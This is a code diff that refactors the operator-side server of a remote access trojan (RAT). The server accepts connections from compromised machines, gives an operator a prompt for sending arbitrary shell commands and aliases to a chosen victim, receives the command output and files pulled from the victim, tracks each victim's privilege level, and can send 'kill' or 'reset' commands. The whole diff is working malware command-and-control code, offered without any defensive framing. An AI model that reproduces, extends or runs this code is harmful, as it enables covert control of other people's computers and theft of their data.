@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import sys
+import time
 import traceback
 
 try:
@@ -23,15 +24,15 @@ class Server:
         self.socket = RATSocket()
         self.connections = []
 
-    def serve(self):
+    def serve(self, recv):
         try:
             self.socket.bind(self.address)
             logger.info('Listening on port {}'.format(self.address[1]))
-            self.socket.accept(self.connection_handler)
+            self.socket.accept(self.connection_handler, recv)
         except socket.error as e:
             logger.error(e)
 
-    def connection_handler(self, conn, addr):
+    def connection_handler(self, conn, addr, recv=None):
         conn.settimeout(5)
         try:
             connection = Client(conn)
@@ -128,51 +129,43 @@ def open_connection(conn):
     Context.remote_commands = json.loads(conn.info['commands'])
     user_type = get_user_type(conn.info['integrity'])
     print('[+] Connected to {}'.format(conn.address))
-    while 1:
-        try:
-            if Context.eof_event.is_set():
-                cwd = conn.info['cwd']
-                cmd = colored_input(
-                    f'{cwd}{Colors.BRIGHT_GREEN}({user_type}){Colors.END}> ' if user_type else f'{cwd}> ')
-                if not cmd.strip():
+    try:
+        while Context.eof_event.wait():
+            cwd = conn.info['cwd']
+            cmd = colored_input(
+                f'{cwd}{Colors.BRIGHT_GREEN}({user_type}){Colors.END}> ' if user_type else f'{cwd}> ')
+            if not cmd.strip():
+                continue
+            cmd_name, cmd_arg = parse(cmd)
+            if cmd in ['kill', 'reset']:
+                conn.send_command(cmd)
+                break
+            elif cmd in ['exit', 'quit']:
+                break
+            elif cmd == 'q':
+                connection = get_last_connection()
+                if connection == conn:
                     continue
-                cmd_name, cmd_arg = parse(cmd)
-                if cmd in ['kill', 'reset']:
-                    Context.current_connection = None
-                    conn.send_command(cmd)
-                    break
-                elif cmd in ['exit', 'quit']:
-                    Context.current_connection = None
-                    break
-                elif cmd == 'q':
-                    connection = get_last_connection()
-                    if connection == conn:
-                        continue
-                    open_connection(connection)
-                    break
-                elif cmd_name in internal_commands:
-                    cmd_id = internal_commands[cmd_name](cmd_arg, conn)
-                    if cmd_id:
-                        Context.last_command_id = cmd_id
-                        Context.eof_event.clear()
-                    continue
-                elif cmd_name in AliasUtil.list():
-                    cmd_id = send_alias(conn, cmd)
-                    if cmd_id:
-                        Context.last_command_id = cmd_id
-                        Context.eof_event.clear()
-                    continue
-                Context.last_command_id = conn.send_command(cmd)
+                open_connection(connection)
+                break
+            elif cmd_name in internal_commands:
+                command_id = internal_commands[cmd_name](cmd_arg, conn)
+            elif cmd_name in Alias.list:
+                command_id = Alias.send(conn, cmd)
+            else:
+                command_id = conn.send_command(cmd)
+            if command_id:
+                Context.last_command_id = command_id
                 Context.eof_event.clear()
-        except socket.error:
-            print_error('[-] Connection closed')
-            break
-        except KeyboardInterrupt:
-            print(Colors.RESET)
-            break
-        except Exception as e:
-            print_error(f'Error: {e}')
-    Context.state = 'local'
+        Context.state = 'local'
+        Context.current_connection = None
+    except socket.error:
+        print_error('[-] Connection closed')
+    except KeyboardInterrupt:
+        print(Colors.RESET)
+        time.sleep(0.1)
+    except Exception as e:
+        print_error(f'{e.__class__.__name__}: {e}')
 
 
 def write(conn, status, result):
@@ -188,26 +181,26 @@ def recv(conn):
     while 1:
         try:
             head = conn.recv_head()
-            id = head['id']
-            type = head['type']
+            result_id = head['id']
+            result_type = head['type']
             eof = 0
             conn.info['cwd'] = head['cwd']
             result = None
-            if type == 'result':
+            if result_type == 'result':
                 result = head['status'], conn.recv_body(head)
                 eof = head['eof']
-            elif type == 'file':
+            elif result_type == 'file':
                 try:
                     filename = head['filename']
                     conn.recv_body(head, file_stream=get_write_stream(filename), update_progress=update_progress)
-                    result = 1, '\nFile saved to: {}'.format(os.path.abspath(filename))
+                    result = 1, f'File saved to: {os.path.abspath(filename)}'
                 except Exception as e:
-                    result = 0, '\nError receiving file: {}'.format(e)
+                    result = 0, f'Error receiving file: {e}'
                 eof = 1
             if result:
                 write(conn, *result)
             if eof:
-                if id == Context.last_command_id:
+                if result_id == Context.last_command_id:
                     Context.eof_event.set()
                 Context.last_command_id = None
         except socket.error:
@@ -221,5 +214,5 @@ def recv(conn):
 if __name__ == '__main__':
     os.system('')
     server = Server(SOCKET_ADDR)
-    threading.Thread(target=server.serve, daemon=True).start()
+    threading.Thread(target=server.serve, args=(recv,), daemon=True).start()
     cmdloop()
